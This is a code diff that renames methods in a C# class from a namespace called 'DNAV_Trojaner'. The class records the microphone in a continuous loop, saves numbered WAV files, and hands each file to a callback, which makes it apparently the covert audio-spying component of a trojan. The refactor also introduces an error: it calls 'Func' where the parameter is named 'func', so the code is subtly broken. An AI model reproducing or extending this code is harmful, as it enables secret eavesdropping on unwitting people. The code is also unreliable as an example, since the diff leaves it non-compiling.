@@ -20,30 +20,30 @@ namespace DNAV_Trojaner {
 
         static private Audio Main = new Audio();
         static private Thread t;
-        static public void start(){
+        static public void Start(){
             t = new Thread(
-            new ThreadStart(Main.pstart));
+            new ThreadStart(Main.PStart));
             t.Start();
         }
 
-        static public void start(int interval){
+        static public void Start(int interval){
             t = new Thread(
-            new ThreadStart(Main.pstart));
+            new ThreadStart(Main.PStart));
             t.Start(interval);
         }
 
-        static public void start(int interval, Execution func){
+        static public void Start(int interval, Execution func){
             t = new Thread(
-            new ThreadStart(Main.pstart));
-            t = new Thread(() => Main.pstart(interval,func));
+            new ThreadStart(Main.PStart));
+            t = new Thread(() => Main.PStart(interval,func));
             t.Start();
         }
 
-        static public void stop(){
-            Main.pstop();
+        static public void Stop(){
+            Main.PStop();
         }
 
-        static public void setPath(string p){
+        static public void SetPath(string p){
             Main.path = p;
         }
         private void DataAvailable(WaveFileWriter wF,WaveInEventArgs e){
@@ -64,58 +64,58 @@ namespace DNAV_Trojaner {
                 wF = null;
             }
         }
-        private void waveSource_DataAvailable(object sender, WaveInEventArgs e) {
+        private void WaveSource_DataAvailable(object sender, WaveInEventArgs e) {
             DataAvailable(waveFile,e);
         }
 
-        private void waveSource_RecordingStopped(object sender, StoppedEventArgs e) {
+        private void WaveSource_RecordingStopped(object sender, StoppedEventArgs e) {
            RecordingStopped(waveSource,waveFile);
         }
 
-        private void waveSourceB_DataAvailable(object sender, WaveInEventArgs e) {
+        private void WaveSourceB_DataAvailable(object sender, WaveInEventArgs e) {
             DataAvailable(waveFileB,e);
         }
 
-        private void waveSourceB_RecordingStopped(object sender, StoppedEventArgs e) {
+        private void WaveSourceB_RecordingStopped(object sender, StoppedEventArgs e) {
            RecordingStopped(waveSourceB,waveFileB);
         }
-        private void ini() {
+        private void Ini() {
             controller = true;
-            ini("");
+            Ini("");
         }
-        private void ini(string suffix) {
+        private void Ini(string suffix) {
             if (controller) {
                 controller = false;
                 waveSource = new WaveInEvent();
                 waveSource.WaveFormat = new WaveFormat(44100, 1);
-                waveSource.DataAvailable += new EventHandler < WaveInEventArgs > (waveSource_DataAvailable);
-                waveSource.RecordingStopped += new EventHandler < StoppedEventArgs > (waveSource_RecordingStopped);
+                waveSource.DataAvailable += new EventHandler < WaveInEventArgs > (WaveSource_DataAvailable);
+                waveSource.RecordingStopped += new EventHandler < StoppedEventArgs > (WaveSource_RecordingStopped);
                 waveFile = new WaveFileWriter(path + suffix + ".wav", waveSource.WaveFormat);
             } else {
                 controller = true;
                 waveSourceB = new WaveInEvent();
                 waveSourceB.WaveFormat = new WaveFormat(44100, 1);
-                waveSourceB.DataAvailable += new EventHandler < WaveInEventArgs > (waveSourceB_DataAvailable);
-                waveSourceB.RecordingStopped += new EventHandler < StoppedEventArgs > (waveSourceB_RecordingStopped);
+                waveSourceB.DataAvailable += new EventHandler < WaveInEventArgs > (WaveSourceB_DataAvailable);
+                waveSourceB.RecordingStopped += new EventHandler < StoppedEventArgs > (WaveSourceB_RecordingStopped);
                 waveFileB = new WaveFileWriter(path + suffix + ".wav", waveSourceB.WaveFormat);
             }
         }
         public delegate void Execution(string path);
 
-        private void pstart() { 
-            ini();
+        private void PStart() { 
+            Ini();
             waveSource.StartRecording();
         }
 
-        private void pstart(int interval) { 
-            pstart(interval, (path) => {});
+        private void PStart(int interval) { 
+            PStart(interval, (path) => {});
         }
-        private void pstart(int interval, Execution func) { 
+        private void PStart(int interval, Execution func) { 
             time = interval;
             loop = true;
             int i = 1;
             controller = true;
-            ini("" + (i++));
+            Ini("" + (i++));
             waveSource.StartRecording();
             while (loop) {
                 System.Threading.Thread.Sleep(time * 1000);
@@ -124,7 +124,7 @@ namespace DNAV_Trojaner {
                 } else {
                     waveSource.StopRecording();
                 }
-                ini("" + (i++));
+                Ini("" + (i++));
                 if (controller) {
                     waveSourceB.StartRecording();
                 } else {
@@ -132,14 +132,14 @@ namespace DNAV_Trojaner {
                 }
                 while (true) {
                     try {
-                        func(path + (i - 2)+ ".wav");
+                        Func(path + (i - 2)+ ".wav");
                         break;
                     } catch (Exception e) {}
                 }
             }
         }
 
-        private void pstop() { 
+        private void PStop() { 
             loop = false;
             waveSource.StopRecording();
         }
